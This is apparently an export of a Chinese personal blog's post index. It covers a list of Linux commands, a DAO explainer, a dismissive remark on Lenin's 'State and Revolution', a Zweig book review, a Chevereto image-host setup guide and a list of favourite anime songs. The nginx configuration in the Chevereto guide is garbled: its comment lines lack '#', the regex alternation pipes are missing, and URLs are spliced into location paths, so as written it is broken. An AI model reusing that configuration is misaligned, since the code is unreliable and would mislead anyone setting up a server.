class="line">lastlog：显示系统中所有用户最近一次登录信息。</span><br><span class="line">users：显示当前登录系统的所有用户的用户列表。</span><br><span class="line">finger：查找并显示用户信息。</span><br></pre></td></tr></table></figure><p>内置命令及其它(19个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">echo：打印变量，或直接输出指定的字符串</span><br><span class="line">printf：将结果格式化输出到标准输出。</span><br><span class="line">rpm：管理rpm包的命令。</span><br><span class="line">yum：自动化简单化地管理rpm包的命令。</span><br><span class="line">watch：周期性的执行给定的命令，并将命令的输出以全屏方式显示。</span><br><span class="line">alias：设置系统别名。</span><br><span class="line">unalias：取消系统别名。</span><br><span class="line">date：查看或设置系统时间。</span><br><span class="line">clear：清除屏幕，简称清屏。</span><br><span class="line">history：查看命令执行的历史纪录。</span><br><span class="line">eject：弹出光驱。</span><br><span class="line">time：计算命令执行时间。</span><br><span class="line">nc：功能强大的网络工具。</span><br><span class="line">xargs：将标准输入转换成命令行参数。</span><br><span class="line">exec：调用并执行指令的命令。</span><br><span class="line">export：设置或者显示环境变量。</span><br><span class="line">unset：删除变量或函数。</span><br><span class="line">type：用于判断另外一个命令是否是内置命令。</span><br><span class="line">bc：命令行科学计算器。</span><br></pre></td></tr></table></figure><p>系统管理与性能监视命令(9个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chkconfig：管理Linux系统开机启动项。</span><br><span class="line">vmstat：虚拟内存统计。</span><br><span class="line">mpstat：显示各个可用CPU的状态统计。</span><br><span class="line">iostat：统计系统IO。</span><br><span class="line">sar：全面地获取系统的CPU、运行队列、磁盘 I/O、分页(交换区)、内存、 CPU中断和网络等性能数据。</span><br><span class="line">ipcs：用于报告Linux中进程间通信设施的状态，显示的信息包括消息列表、共享内存和信号量的信息。</span><br><span class="line">ipcrm：用来删除一个或更多的消息队列、信号量集或者共享内存标识。</span><br><span class="line">strace：用于诊断、调试Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</span><br><span class="line">ltrace：命令会跟踪进程的库函数调用,它会显现出哪个库函数被调用。</span><br></pre></td></tr></table></figure><p>关机&#x2F;重启&#x2F;注销和查看系统信息的命令(6个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shutdown：关机。</span><br><span class="line">halt：关机。</span><br><span class="line">poweroff：关闭电源。</span><br><span class="line">logout：退出当前登录的Shell。</span><br><span class="line">exit：退出当前登录的Shell。</span><br><span class="line">Ctrl+d：退出当前登录的Shell的快捷键。</span><br></pre></td></tr></table></figure><p>进程管理相关命令(15个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bg：将一个在后台暂停的命令，变成继续执行 (在后台执行)。</span><br><span class="line">fg：将后台中的命令调至前台继续运行。</span><br><span class="line">jobs：查看当前有多少在后台运行的命令。</span><br><span class="line">kill：终止进程。</span><br><span class="line">killall：通过进程名终止进程。</span><br><span class="line">pkill：通过进程名终止进程。</span><br><span class="line">crontab：定时任务命令。</span><br><span class="line">ps：显示进程的快照。</span><br><span class="line">pstree：树形显示进程。</span><br><span class="line">nice/renice：调整程序运行的优先级。</span><br><span class="line">nohup：忽略挂起信号运行指定的命令。</span><br><span class="line">pgrep：查找匹配条件的进程。</span><br><span class="line">runlevel：查看系统当前运行级别。</span><br><span class="line">init：切换运行级别。</span><br><span class="line">service：启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从概念解析到项目概览，三分钟搞懂什么是 “DAO”？</title>
      <link href="/64.html"/>
      <url>/64.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>区块链上有不少让人兴奋的概念，DAO 是其中之一。为什么 DAO 会引起这么大的关注？其中很重要的原因是它具有的特性：自动化执行的统一规则、透明度、权益相关者都可以表达自己的利益诉求，它代表了一种组织管理的可能方向。但同时DAO发展处于初级阶段，它的治理机制是否合理？如何才能对组织发展有利？这里有很多细节需要探讨。</p></blockquote><p>从历史看，组织的概念一直以来都是以严格的所有权结构为中心。在过去的几十年，公司开始引入开放、扁平的组织结构，它允许公司里的更多人可以表达自己的声音。但是，最终而言，为整个组织做决策通常是一个人或少数人的责任。</p><p>当我们观察大公司，明确的层级结构是标准。毕竟，Apple、Google以及Facebook都有CEO、CTO以及CMO，同时还有总监、经理以及相应的下属。早期的初创公司和大公司都有明确定义的所有权和领导结构。尽管在一家公司拥有股权是可能的，且理论上可以拥有组织的一部分，但其影响力是非常有限的。</p><p>几个世纪以来，确定所有权、层级以及规则的困境给组织发展带来了主要障碍。但是，如果公司不一定需要所有者怎么办？这个问题在历史上的大多数时侯都是基于理想主义的。而如今实现分布式的无所有者组织成为可能，这要感谢 DAO（去中心化自主组织）的出现。</p><h2 id="什么是-DAO"><a href="#什么是-DAO" class="headerlink" title="什么是 DAO"></a>什么是 DAO</h2><p>DAO 有时候也称为分布式自治公司（DAC，decentralized autonomous corporation），它是一种由编码为计算机程序的规则所表示的组织，该程序是透明的、由股东或代币持有人控制，且不受中心机构影响。 DAO 利用区块链来验证交易。</p><p>DAO 中的每个人都可以发布提议并进行投票来做决策。加密货币用来代表关键价值，在指定时期结束时具有最高数额的投票获胜。这跟其他形式的投票形成直接对比，这些投票通常每人的比重相同。通常，提案为「是或否」的问题，即公司A是否应该开发产品x？</p><h2 id="为什么人们想要这个"><a href="#为什么人们想要这个" class="headerlink" title="为什么人们想要这个"></a>为什么人们想要这个</h2><p><strong>快速、无边界的事务决策</strong></p><p>如果在A国的某人想跟B国、C国等国家的创始人一起创业，当前做个事情的过程非常复杂。不同的司法管辖区有不同的要求。决策所需的时间范围也有所不同。例如，假设A国的某人只需一天即可正式成立业务，而在B国的那位需要3个月时间来启动。 显然，在B国的人并不拥有跟A国的那位一样的资源。</p><p>DAO 则提供了一种解决方案，可以通过遵守一套标准规则，让每个人都可以在同等条件下工作，而不用考虑所在的地理位置。 本质上说，创建 DAO 的一个主要原因之一是为组织的成立和运营提供平等的体系。</p><p><strong>组织范围内的投票</strong></p><p>很多公司都有董事会来做重要决策。这么做的问题是这些组织通常只对少数选出的问题进行投票，且并不一定代表组织的大多数。 DAO 可以改变这一点，它允许组织的任何人都可以就他们关心的问题进行投票。例如，A可能会关心问题A和问题C，但不怎么关心问题B。</p><p>通过 DAO ，A 可以根据自己关心的程度来对提案进行相应比例的代币投票。 DAO 不会使用对组织内成员的输入忽略或不加计入的系统，而是确保所有投票都被统计并向所有人显示。</p><p><strong>无法篡改规则</strong></p><p>在任何组织内，政策和规则决定什么能做以及什么不能做。例如，在一家公司，不遵守规定的员工可能会遭受惩罚。如果某人上班迟到，这可能会也可能不会导致相应地扣减工资。这个决定可以通过时间戳来自动执行，但并非所有组织都会强制执行。</p><p>例如，如果老板迟到，它可能会通过设置例外情况来变更这个规则。在 DAO 中，它会通过代码确保规则适用于每个人。组织内已建立的一套规则无法被篡改，除非投票人群体同意这么做。</p><h2 id="DAO-的局限"><a href="#DAO-的局限" class="headerlink" title="DAO 的局限"></a>DAO 的局限</h2><p><strong>很多决策依赖于人的活动，而不是自动化（过程缺乏监管）</strong></p><p>智能合约已经实现让很多人工任务变成自动化执行。例如，智能合约可以决定A是否可以向B发送资金，这个决定基于它是否满足一组标准。问题在于，无法仅通过点击按钮来完成很多活动。而且成员资格如此开放，有可能导致 DAO 内质量较低，噪音较大，但这些都可以通过 DAO 筛选流程或最低代币持有量来解决，以至少确保参与者有代价在游戏中，并激励他们看到 DAO 的成功。</p><p>其中一个案例是关于分配工作资金。例如，DAO 可以使用智能合约来发送资金，开发团队用该资金构建APP。但是，DAO 无法确保开发团队完成开发或者甚至无法确定资金是否被正确使用。最小化此类问题的机制可能包括要求通过里程碑来对大型项目是否完成进行投票。</p><p><strong>缺乏法律支持</strong></p><p>尽管由于 DAO 的无边界性质，它被认为在组织业务运营上更有效率，但这也可以看作为是一种缺陷。虽然 DAO 可以用代码取代法律合同的各个方面，并节省了大量的运营开销，但在某些情况下，在促进 DAO 的智能合同所概述的规则之外没有法律保护。如果 DAO 的控制权集中或定义模糊，这可能会产生问题，尽管有些 DAO 也可能在 DAO 本身背后形成法律实体。有一项怀俄明州 DAO 法案通过了怀俄明州参议院委员会，该法案将有助于建立法律认可的 DAO 。</p><p>根据 DAO 的设立方式，与 CEO 等领导层在必要时快速决策相比，可能更难协调和快速行动。不过， DAO 可以设置不需要太长时间的配额，并对 DAO 成员的反应速度提出要求。另外在一开始有很多决策要做的时候，可以在某些成员之间进行更多的集权，然后随着时间的推移， DAO 会以所谓的 “渐进式分权 “的方式进行分权。”</p><p>还有可能出现选民冷漠的情况，即并非所有成员都想投票，或甚至最有资格对所有变化进行投票。在这种情况下，很可能会有选民将投票权委托给那些能够更了解情况、更积极地进行投票的成员，这些成员也与他们的信仰一致。这些代表有时被称为协议政治家，因为他们经常在 DAO 中为成员的委托投票进行竞选，类似于现有政治家的做法。我们可能会出现协议游说团体，试图影响这些政治家的决定。反过来说，有一天，我们甚至可能看到 DAO 进行游说，自己成为社会中的主要政治机构。</p><h2 id="当前最具人气的-DAO"><a href="#当前最具人气的-DAO" class="headerlink" title="当前最具人气的 DAO"></a>当前最具人气的 DAO</h2><p><strong>Dash DAO</strong></p><p>DashDAO 由主节点（持有至少1000个DASH代币的权益持有者）管理。主节点可以运行重要功能，包括即时发送（InstantSend）和隐私发送（PrivateSend）。他们同时也为使用 Dash 国库资金的提案进行投票。任何人可以向主节点提交提案。5个DASH的费用是必须的，作为反垃圾发送的费用。如果有足够的主节点投票，则就可以为该提案提供资金。</p><p><strong>BitShares</strong></p><p>BitShares 于2013年发布，它是第一个通过代表和见证人选举程序实现 DAO 的平台。代表向平台提交更新和改进。见证人验证交易并将其发布到区块链上。任何持有 BTS 代币的人，也就是持有平台原生代币的人，都可以进行投票。</p><p><strong>Aragon</strong></p><p>Aragon 有一个 DAO ，它允许其代币 ANT 持有人创建属于他们自己的 DAO 组织，并就决策进行投票。其他功能还包括开采新代币、向用户支付各种代币、以及为组织内的个人定制权限的设置。像Liverpeer、MyBit、以及BrightID等项目都使用了Aragon。</p><p><strong>MakerDAO</strong></p><p>MakerDAO 使用了这样的 DAO ：其原生代币 MKR 的持有人可以就影响其P2P借贷协议的决策进行投票。MKR代币持有人投票决定年化借贷利率（稳定费）、开启每个CDP所需的抵押资产比率（抵押率）、在ETH 闪崩或其他无法意料情况下关闭协议的能力。</p><p><strong>Moloch DAO</strong></p><p>Moloch DAO的成员从 DAO 资助的公共物品的改善中享受到集体利益。Moloch DAO 当前专注于资助以太坊2.0的开发。</p><p><strong>DAOStack</strong></p><p>DAOStack 为 Alchemy 功能，它是首个基于 DAOStack 构建的实时去中心化应用。Alchemy 当前正在为ETHGlobal、Kyber以及Polkadot这些组织管理实时 DAO。当投票结束，预测正确的人们可以从其质押权益中获得收益。GEN是DAOStack的原生代币，旨在帮助去中心化组织有效扩展的同时不损害其价值。</p><h2 id="财富500强公司能否变成分布式的组织？"><a href="#财富500强公司能否变成分布式的组织？" class="headerlink" title="财富500强公司能否变成分布式的组织？"></a>财富500强公司能否变成分布式的组织？</h2><p>2017年，西门子成为第一家在其内部使用 DAO 的财富500强公司。完全在 DAO 上运行大公司的概念很让人感兴趣，但还不太实用。如果一家财富500强公司今天突然决定就其所有治理全部转向 DAO ，这会带来无数的技术挑战（UI&#x2F;UX、安全、扩展性）需要解决，以使得区块链能支持此类组织结构。上述提及的局限性也将适用。对于参与者来说，这里会有学习曲线。</p><p>最后，还有人为因素需要考虑。如果参与率太低，就很难分辨出投票是否实际上代表组织的真正大多数。对于 DAO 提案和投票过于依赖，也可能会导致个人持续进行很多小决策，这从根本上限制了投票人实际上必须完成所分配任务的时间。从现实角度，因为上述原因，创建运行在DAO上的小型组织更有可行性。 （注：公爵认为 DAO 上运行较大组织暂时不太可行，所以财富500强公司在DAO上运行还不现实）</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 去中心化 </tag>
            
            <tag> DAO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习方向】项目管理十大知识领域和47个过程图解</title>
      <link href="/63.html"/>
      <url>/63.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/file/project1.png" alt="project1" title="project1"><br><img src="https://cos.gjcloak.xyz/file/project2.png" alt="project2" title="project2"><br><img src="https://cos.gjcloak.xyz/file/project3.png" alt="project3" title="project3"><br><img src="https://cos.gjcloak.xyz/file/project4.png" alt="project4" title="project4"><br><img src="https://cos.gjcloak.xyz/file/project5.png" alt="project5" title="project5"><br><img src="https://cos.gjcloak.xyz/file/project6.png" alt="project6" title="project6"><br><img src="https://cos.gjcloak.xyz/file/project7.png" alt="project7" title="project7"><br><img src="https://cos.gjcloak.xyz/file/project8.png" alt="project8" title="project8"><br><img src="https://cos.gjcloak.xyz/file/project9.png" alt="project9" title="project9"><br><img src="https://cos.gjcloak.xyz/file/project10.png" alt="project10" title="project10"><br><img src="https://cos.gjcloak.xyz/file/project11.png" alt="project11" title="project11"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 知识领域 </tag>
            
            <tag> 综合管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《国家与革命》</title>
      <link href="/62.html"/>
      <url>/62.html</url>
      
        <content type="html"><![CDATA[<p>马克思做了两件事，一是道出了这个世界的本质，二是提出了构建共产主义的宏大构想</p><p>第一点是马克思的历史功绩，不容否认；第二点则过于完美，完美的像天堂。</p><p>马克思仅仅描绘了一个天堂般的社会，除了用暴力、毁灭的方式摧毁现存的一切外，对于怎么实现共产主义其实他自己也不知道，他只是说出了天堂就在那里，至于怎么到达，他也没解决方案。</p><p>所以这就给后来者如列宁这个神棍妄想症患者有了发挥的空间，于是共产主义就像宗教、民主自由思想一样，变成了新的统治阶级维护统治的有力武器。所有的统治都是为了实现终极目标共产主义，因此做什么都是可以理解的，“真理”在手，天下无敌。</p><p><a href="https://cos.gjcloak.xyz/file/%E5%88%97%E5%AE%81%E3%80%8A%E5%9B%BD%E5%AE%B6%E4%B8%8E%E9%9D%A9%E5%91%BD%E3%80%8B.pdf">文件下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐 </tag>
            
            <tag> 列宁 </tag>
            
            <tag> 国家与革命 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《人类群星闪耀时》——人类壮美的发展史</title>
      <link href="/30.html"/>
      <url>/30.html</url>
      
        <content type="html"><![CDATA[<p>其实说是发展史并不确切，应该说这是一部纪念人类伟大辉煌瞬间的赞美诗。</p><p><a href="https://cos.gjcloak.xyz/file/2022022801342646.jpg"><img src="https://cos.gjcloak.xyz/file/2022022801342646.jpg"></a></p><p>说说题材</p><p>作者茨威格是一位小说家，同样的，这书也主要采用小说的形式，比较通俗易懂，情感的表达也很灵活。不过又因为讲述的故事内容也包含歌德与列夫托尔斯泰等诗人或者剧作家的故事，所以作者也很灵活的在其中采用诗歌和戏剧的方式。总体上看，因为讲述十二个独立的小故事，又采用多种题材，读者阅读时非常的轻松、不乏味。也可以看出作者写作功力非常深厚。</p><p>聊聊内容</p><p>整本书包含十二个由按时间顺序排列的小故事，之间虽然没有联系，但作者认为这十二个瞬间是人类智慧以及历史命运的选择的共同体现。作者从建立发现太平洋一直说到列宁回国，每一个小故事都着力在向读者还原当时的情形和故事，不得不说，作者的语言非常有张力，每一个故事都能在读者脑海中建立电影一般精美的画面。和一般的讲述历史内容的小说不一样的是，作者在选择内容的时候，还包含了许多名曲，名作的创作过程，在作者看来，这些作品的诞生于形成本身就是一种奇迹。于是我们得以跟着作者的笔，品味众多名曲的动人心魄的魅力，得以一观这些伟大作品的诞生过程。几年前曾经看过一套现代作家写一部历史题材的作品，也采用小说方式来讲述，聚焦于英国、德国、俄国、美国的近现代史，也是非常好的一套书，在这里把书名放出来，感兴趣的朋友也可以看看：《巨人的陨落》《世界的凛冬》《永恒的边缘》。</p><p><img src="https://cos.gjcloak.xyz/file/frc-8a5ca101446457258bdbd3bdd0539403.jpg"></p><p>在十二个小故事中，对我来说最为感动的是列夫·托尔斯泰的故事。和其他故事不一样，这一章主要采用戏剧的方式，描绘列夫·托尔斯泰下定决心逃离过去充满虚伪的生活，在医生和女儿的陪伴下，像千千万万贫苦百姓一般在某个车站的简陋小屋中去世。看过很多列夫·托尔斯泰的书，最深受感动的就是《复活》一书，还记得在那本书的读后感中我写到：列夫·托尔斯泰满怀对广大贫苦百姓的悲悯，但是对于他来说，将这一切悲悯化作对旧制度的拥护者无限的爱与包容才能真正改变旧制度，最终，列夫·托尔斯泰选择了东正教。而本书的作者将描写列夫·托尔斯泰的这一章命名为《逃向上帝》，我想，这也许就是列夫·托尔斯泰的内心吧。</p><p>作者在本书中，写出了非常多的对于各位名人、各大名事、各大名作的理解，透过这些理解与诠释，我们看到在一个个历史事件中闪耀的人类智慧闪光点，而这些闪光点经作者的手的描绘，最终让读者深深地感叹：这不愧是人类群星闪耀的时刻啊！</p><p>如果对这本书感兴趣的话，也可以通过点击 <a href="https://cos.gjcloak.xyz/uploads/2022/04/26/%E8%8C%A8%E5%A8%81%E6%A0%BC-%E4%BA%BA%E7%B1%BB%E7%BE%A4%E6%98%9F%E9%97%AA%E8%80%80%E6%97%B6%5B%E5%A5%A5%5D%E8%8C%A8%E5%A8%81%E6%A0%BC.%E7%95%B2%E7%94%B0%E3%80%81%E5%BE%90%E8%8B%B1%E8%AF%91.%E9%99%95%E8%A5%BF%E4%BA%BA%E6%B0%91%E5%87%BA%E7%89%88%E7%A4%BE%282009%29.pdf">人类群星闪耀时</a> 去下载查看！喜欢的话，留个评论吧！</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书籍 </tag>
            
            <tag> 人类群星闪耀时 </tag>
            
            <tag> 名著 </tag>
            
            <tag> 推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过宝塔搭建chevereto图床</title>
      <link href="/61.html"/>
      <url>/61.html</url>
      
        <content type="html"><![CDATA[<p>准备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一台带宝塔面板的服务器</span><br><span class="line">Chevereto 压缩包</span><br></pre></td></tr></table></figure><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>前往<a href="https://cos.gjcloak.xyz/file/chevereto-free-multi-language-master.zip">这里下载</a> Chevereto 压缩包，一会就可以下载完成</p><p>中文配置参考这里：<a href="https://github.com/keven1024/chevereto-free-multi-language/discussions/1">How to Install - 如何安装</a></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>进入宝塔面板，在网站菜单，点击添加站点，如下图<br><a href="https://cos.gjcloak.xyz/file/2022022307593560.png"><img src="https://cos.gjcloak.xyz/file/2022022307593560.png"></a><br>填入域名（可以携带端口），数据库选择MYSQL，数据库用户名密码根据自己需要设置，再点击提交即可<br><a href="https://cos.gjcloak.xyz/file/2022022308024423.png"><img src="https://cos.gjcloak.xyz/file/2022022308024423.png"></a></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>进入网站的根目录，把下载的 Chevereto 压缩包上传并解压<br><a href="https://cos.gjcloak.xyz/file/2022022308074357.jpg"><img src="https://cos.gjcloak.xyz/file/2022022308074357.jpg"></a></p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>这个时候需要对设置进行调整，在网站处，点击设置<br><a href="https://cos.gjcloak.xyz/file/2022022308091927.png"><img src="https://cos.gjcloak.xyz/file/2022022308091927.png"></a><br>找到配置文件<br>在最后一个大括号前加入下面的代码<br><a href="https://cos.gjcloak.xyz/file/2022022308112145.png"><img src="https://cos.gjcloak.xyz/file/2022022308112145.png"></a><br>加完之后是这样的<br><a href="https://cos.gjcloak.xyz/file/2022022308144039.jpg"><img src="https://cos.gjcloak.xyz/file/2022022308144039.jpg"></a><br>需要增加的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Disable access to .ht* files</span><br><span class="line">location ~ /\.ht &#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ /(appcontentlib)/.*\.(pophplocksql)$     &#123;</span><br><span class="line">   deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Disable log on not found images + image replacement</span><br><span class="line">location ~* (jpe?gpnggif) &#123;</span><br><span class="line">    log_not_found off;</span><br><span class="line">    error_page 404 /contenthttps://qn.cndrew.cn/system/default/404.gif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Enable CORS header (needed for CDN)</span><br><span class="line">location ~* \.(ttfttcotfeotwoffwoff2cssjs)$ &#123;</span><br><span class="line">    add_header Access-Control-Allow-Origin &quot;*&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Force serve upload path as static content (match your     upload folder if needed)</span><br><span class="line">location https://qn.cndrew.cn &#123;&#125;</span><br><span class="line"></span><br><span class="line">Route dynamic request to index.php</span><br><span class="line">location / &#123;</span><br><span class="line">    try_files $uri $uri/ /index.php?$query_string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>然后通过前面填写域名进入到你新建的网站，跟随着设置一步一步来就行。这里会让你输入一次你的数据库的名字账号和密码，把你上面新建的那个输进去就好了<br>全部设置好之后你会获得一个管理员账号（名字密码都是自己设置的。点击登陆进去可以进入仪表盘设置网站的外观和配置。可以切换语言。<br>然后到这里就搭建结束了。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chevereto </tag>
            
            <tag> 图床 </tag>
            
            <tag> 宝塔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音乐既是灵魂 那些打动你的动漫音乐</title>
      <link href="/29.html"/>
      <url>/29.html</url>
      
        <content type="html"><![CDATA[<p>对于一部动漫作品来说，画风、剧情、CV、是很重要的，但是还有一个因素同样重要，那就是音乐，不管是OP、ED、还是插曲，合适的音乐会让作品的好评度得到不错的提升。如果说画风、剧情、CV是动漫作品的身体的话，那么音乐就是作品的灵魂。现在就来盘点那些打动你的动漫音乐。（个人观点）</p><p>1、君の知らない物语——出自《化物语.重蟹》ED</p><p>歌曲出自supercell之手，没错，就是使用V家软件：VOCALOID的那个团体，平时多数使用的是初音。ryo向我们展示了他的编曲才华，歌曲前部分的钢琴曲配合主唱优美的声线可以说起了一个好头。随后即是鼓点以及节奏吉他。然后进入歌曲高潮，所有乐器一起爆发，加上主唱的唱功，完全把我震撼了。随后进入吉他钢琴合奏，钢琴与吉他配合得恰到好处，本以为电吉他会solo，但是没想到突出的却是钢琴，打动人心但是又不拖拉。贝斯就默默的铺垫着底音。可以说是战场原的角色歌吧，歌曲的快节奏让人热血沸腾，曾获动漫歌曲TOP100冠军。</p><p>2、恋爱サキュレション——- 《化物语.咒蛇》OP</p><p>歌曲演唱者也就是千石抚子的CV：花泽香菜?，编曲：神前暁。花泽甜美的声线把抚子的可爱完全表达了出来，歌曲主伴奏是小号，及其贝斯、架子鼓、没有粗暴的电吉他，风格很可爱，也很文静。体现出千石抚子的性格。作为角色歌，当然要表现角色，这一点神前暁非常的成功。</p><p>3、白金ディスコ——–出自《伪物语.凤凰》OP</p><p>歌曲由阿良良木月火的CV：井口裕香?? 演唱，由笛子和打击乐器演奏，裕香的声音和演奏风格完美的体现了阿良良木月火俏皮、可爱的性格，说实话，我第一次看到这个OP的时候真心被萌到了，那简单的肢体舞蹈放在月火酱身上就是一大萌点啊~~~</p><p>4、月光石——–出自《鸦KARAS》</p><p>歌曲由Rurutia演唱，Rurutia的声音轻柔、富有感情，在此歌曲中钢琴和Rurutia的轻柔声线完美配合，缓慢的节奏流露出悲伤的气息，Rurutia被称之为治愈系，但是唱悲伤的歌曲也很有料啊。是我比较钟情的歌曲之一。</p><p>5、secret base——–《我们仍未知道那天所看见的花的名字》ED</p><p>比较温情的一首歌，也有悲伤的气息，前奏的钢琴做了一个好的铺垫，随后就是吉他的本音和架子鼓，演唱：ZONE，《未闻花名》的成功之处就是剧情和音乐，垂泪的剧情加上悲伤的音乐成就了它新一代垂泪神作。个人觉得面码版的更好听。</p><p>6、コンプリケイション——-《无头骑士异闻录》OP</p><p>歌曲由rookiez is punk＇d演唱，可以说rookiez is punk＇d也是因为这首歌而出名的。前奏是吉他与鼓。随后就是节奏吉他的强势突入，节奏稍快，进入歌曲高潮之后是一段说唱，这种风格很常见。之后就是吉他SOLO，很给力，整首歌曲保持快节奏，比较容易燃起热血。</p><p>7、GOD KNOWS——出自《凉宫春日的忧郁》插曲</p><p>歌曲的编曲依旧是我们的神前晓大神。由团长大人的CV：平野凌? 演唱。? 前奏就是电吉他的狂啸，（有点吓到我了），歌曲的节奏听起来比较乱其实乱之中跟歌曲本身又是完美的配合，特别是电吉他，音色听起来与歌曲不配和，但是仔细听听又觉得配合完美。我给神前晓大神跪了。。。人才啊。</p><p>8、pray—————-出自《银魂》OP</p><p>歌曲由川濑智子演唱，前奏的啦啦啦，是我比较喜欢的地方，哈哈，节奏不错。前奏不错，后面比较普通，本来以为这首歌也就这样了，但是歌曲高潮的时候节奏突然加快，智子的声音得到完美的释放，整首歌曲的灵魂就在于高潮了。</p><p>9、鸟之诗————出自《AIR》OP</p><p>催泪神作，还有游戏的主题曲，主唱：Lia。前奏是很温柔的钢琴，宁静又舒适。随后就是主唱的逆天唱功。鼓点恰到好处，高潮部分是歌曲的精华，没有一点停顿的感觉，一直在循环一样。歌曲听不出来悲伤的气息，但是结合AIR来听，又是不同的感觉，这也是被称之为神曲的原因。</p><p>10、Listen!——出自《轻音少女》ED</p><p>轻音中的歌曲可算是火了一把，本来就是以音乐为主题的动漫歌曲怎么可能逊色呢，《Listen》就是一个代表，由秋山澪的CV：日笠阳子。世萌的CV声音怎么可能输，整首歌曲靠着阳子的唱功包了下来，节奏吉他的音色不错，膜拜中。。。。</p><p>11、化作千风——《银魂》恶搞，银桑版</p><p>这首歌曲贝本来是缅怀死者的歌曲，然后我们无节操的银桑就挑战了，本来那一集看得挺伤感的， ED的时候我们的银桑一张口我就笑喷了。。。喜感啊·~唱着唱着还忘词了，然后果断忽悠过去。。。。然后银桑的CV：杉田智和 被老妈打电话投诉了。。。说：智和，你给我唱好点！可惜智和没出完整版的，不然又要火，哈哈哈。</p><p>12、BLACK★ROCK SHOOTER——-出自《黑岩射手》</p><p>歌曲由：初音未来? 演唱。? 初音未来，属于VOCALOID软件，虚拟歌手，因外表可爱，声音独特获得全球粉丝的喜爱，（我也是MIKU的粉丝）因为黑岩的样子长得很像黑化后的MIKU，所以网上很多人以为黑岩和MIKU是一个人，（MIKU酱怎么可以拿着大炮和剑到处走呢~~）不过这首歌曲就是MIKU酱为黑岩演唱的。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 音乐 </tag>
            
            <tag> AIR </tag>
            
            <tag> OP </tag>
            
            <tag> 凉宫春日的忧郁 </tag>
            
            <tag> 我们仍未知道那天所看见的花的名字 </tag>
            
            <tag> 插曲 </tag>
            
            <tag> 无头骑士异闻录 </tag>
            
            <tag> 物语系列 </tag>
            
            <tag> 银魂 </tag>
            
